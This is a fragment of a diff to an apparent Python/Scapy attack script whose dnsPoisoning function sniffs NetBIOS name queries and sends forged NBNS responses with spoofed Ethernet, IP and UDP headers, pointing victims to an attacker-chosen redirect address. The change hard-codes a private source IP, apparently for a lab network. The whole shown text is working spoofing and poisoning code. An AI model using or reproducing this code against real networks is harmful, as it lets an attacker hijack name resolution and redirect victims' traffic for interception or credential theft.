@@ -18,7 +18,7 @@ def dnsPoisoning(victimIP, url, redirectIP):
             pkt.show()
             print("***")
             etherLayer = Ether(src =get_if_hwaddr(networkInterface), dst = pkt[Ether].src)
-            ipLayer = IP(src = pkt[IP].dst, dst = pkt[IP].src)
+            ipLayer = IP(src = "192.168.56.103", dst = pkt[IP].src)
             udpLayer = UDP(sport = pkt[UDP].dport, dport = pkt[UDP].sport)
             nbnsResponse = NBNSQueryResponse(NAME_TRN_ID = pkt[NBNSQueryRequest].NAME_TRN_ID, RR_NAME = pkt[NBNSQueryRequest].QUESTION_NAME,
                                              QDCOUNT=0, ANCOUNT = 1, NSCOUNT = 0,ARCOUNT = 0,  NB_ADDRESS = redirectIP)
